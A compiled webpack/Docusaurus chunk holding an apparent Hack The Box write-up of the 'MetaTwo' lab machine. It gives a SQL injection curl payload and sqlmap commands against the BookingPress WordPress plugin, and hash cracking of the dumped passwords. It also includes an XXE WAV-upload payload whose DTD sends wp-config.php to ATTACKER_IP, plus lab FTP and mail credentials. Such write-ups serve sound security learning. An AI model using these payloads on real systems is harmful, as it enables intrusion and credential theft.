"use strict";(self.webpackChunk_2h3ph3rd_github_io=self.webpackChunk_2h3ph3rd_github_io||[]).push([[7879],{5839:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>i,default:()=>d,frontMatter:()=>r,metadata:()=>o,toc:()=>p});var s=t(4848),a=t(8453);const r={},i="MetaTwo",o={id:"writeups/htb/2024/metatwo",title:"MetaTwo",description:"nmap scan",source:"@site/docs/writeups/htb/2024/metatwo.md",sourceDirName:"writeups/htb/2024",slug:"/writeups/htb/2024/metatwo",permalink:"/docs/writeups/htb/2024/metatwo",draft:!1,unlisted:!1,editUrl:"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/writeups/htb/2024/metatwo.md",tags:[],version:"current",frontMatter:{},sidebar:"writeupsSidebar",previous:{title:"\u2139\ufe0f About",permalink:"/docs/writeups/"},next:{title:"Perfection",permalink:"/docs/writeups/htb/2024/perfection/"}},c={},p=[{value:"nmap scan",id:"nmap-scan",level:3},{value:"Analyzing the website",id:"analyzing-the-website",level:3}];function l(e){const n={a:"a",code:"code",h1:"h1",h3:"h3",p:"p",pre:"pre",...(0,a.R)(),...e.components},{Image:t}=n;return t||function(e,n){throw new Error("Expected "+(n?"component":"object")+" `"+e+"` to be defined: you likely forgot to import, pass, or provide it.")}("Image",!0),(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.h1,{id:"metatwo",children:"MetaTwo"}),"\n",(0,s.jsx)(t,{src:"/images/writeups/htb/metatwo/banner.png"}),"\n",(0,s.jsx)(n.h3,{id:"nmap-scan",children:"nmap scan"}),"\n",(0,s.jsxs)(n.p,{children:["By scanning with nmap we can find three open ports. In particular, on port 80 there is a website available based on Wordpress at the address ",(0,s.jsx)(n.code,{children:"metapress.htb"})]}),"\n",(0,s.jsx)(t,{src:"/images/writeups/htb/metatwo/nmap.png"}),"\n",(0,s.jsx)(n.h3,{id:"analyzing-the-website",children:"Analyzing the website"}),"\n",(0,s.jsx)(n.p,{children:"By looking to the source code of the index it is possible to see that the website uses Wordpress."}),"\n",(0,s.jsx)(t,{src:"/images/writeups/htb/metatwo/source.png"}),"\n",(0,s.jsx)(n.p,{children:"We can also notice that a plugin called bookingpress-appointment-booking is used. with version 1.0.10. It is enough to search on Google for vulnerabilities to find a SQLi."}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.a,{href:"https://wordpress.org/plugins/bookingpress-appointment-booking/",children:"https://wordpress.org/plugins/bookingpress-appointment-booking/"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.a,{href:"https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357",children:"https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357"})}),"\n",(0,s.jsx)(n.p,{children:"The SQLi is:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=3187120274&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'\n"})}),"\n",(0,s.jsx)(n.p,{children:"Enumerate dbs"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"sqlmap -u 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=3187120274&category_id=33&total_service=1' -p total_service --batch --dbs\n"})}),"\n",(0,s.jsx)(n.p,{children:"Enumerate users"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"sqlmap -u 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=3187120274&category_id=33&total_service=1' -p total_service --batch -D blog -T wp_users --dump\n"})}),"\n",(0,s.jsx)(n.p,{children:"Get password of admin and manager users"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"sqlmap -u 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=3187120274&category_id=33&total_service=1' -p total_service --batch --sql-query \"SELECT user_pass FROM wp_users WHERE ID=1\"\n"})}),"\n",(0,s.jsx)(t,{src:"/images/writeups/htb/metatwo/sqlmap.png"}),"\n",(0,s.jsx)(n.p,{children:"Final hashes"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. admin\n$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70 manager\n"})}),"\n",(0,s.jsxs)(n.p,{children:["Using hashcat and the rockyou list is possible to find the password for manager: ",(0,s.jsx)(n.code,{children:"partylikearockstar"}),"."]}),"\n",(0,s.jsx)(t,{src:"/images/writeups/htb/metatwo/manager.png"}),"\n",(0,s.jsx)(n.p,{children:"Once inside we can try to exploit the permissions of the manager user.\nWe can use tool like Wappalyzer to find the version of Wordpress used by the website (5.6.2)."}),"\n",(0,s.jsx)(n.p,{children:"There is a vulnerability that exploits the upload of a new media element to the website. The vulnerability is described here:"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.a,{href:"https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5",children:"https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5"})}),"\n",(0,s.jsx)(n.p,{children:"One file will be used for upload:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-xml",metastring:'title="payload.wav"',children:'RIFFXXXXWAVEBBBBiXML<!DOCTYPE r [\n<!ELEMENT r ANY >\n<!ENTITY % sp SYSTEM "http://ATTACKER_IP:ATTACKER_PORT/xxe.dtd">\n%sp;\n%param1;\n]>\n<r>&exfil;</r>\n'})}),"\n",(0,s.jsx)(n.p,{children:"Another will be server on the attacker machine:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-xml",metastring:'title="xxe.dtd"',children:'<!ENTITY % data SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=../wp-config.php">\n<!ENTITY % param1 "<!ENTITY exfil SYSTEM \'http://ATTACKER_IP:ATTACKER_PORT/?%data;\'>">\n'})}),"\n",(0,s.jsx)(n.p,{children:"Change ATTACKER_IP and ATTACKER_PORT with your values."}),"\n",(0,s.jsx)(n.p,{children:"Remember to serve the file on your local pc:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"python3 -m http.server PORT\n"})}),"\n",(0,s.jsxs)(n.p,{children:["In the ",(0,s.jsx)(n.code,{children:"wp-config.php"})," we can find the credentials for the ftp server:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-php",metastring:'title="wp-config.php"',children:"...\ndefine( 'FTP_USER', 'metapress.htb' );\ndefine( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );\n...\n"})}),"\n",(0,s.jsx)(t,{src:"/images/writeups/htb/metatwo/ftp.png"}),"\n",(0,s.jsxs)(n.p,{children:["In addition to the blog files, there is also a folder called ",(0,s.jsx)(n.code,{children:"mailer"})," where we can find a file ",(0,s.jsx)(n.code,{children:"send_email.php"}),".\nInside the file we can find the credentials for the mail server:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-php",metastring:'title="send_email.php"',children:'...\n$mail->Username = "jnelson@metapress.htb";\n$mail->Password = "Cb4_JmWM8zUZWMu@Ys";\n...\n'})}),"\n",(0,s.jsx)(n.p,{children:"By logging in using ssh we can find the user flag."})]})}function d(e={}){const{wrapper:n}={...(0,a.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(l,{...e})}):l(e)}},8453:(e,n,t)=>{t.d(n,{R:()=>i,x:()=>o});var s=t(6540);const a={},r=s.createContext(a);function i(e){const n=s.useContext(r);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:i(e.components),s.createElement(r.Provider,{value:n},e.children)}}}]);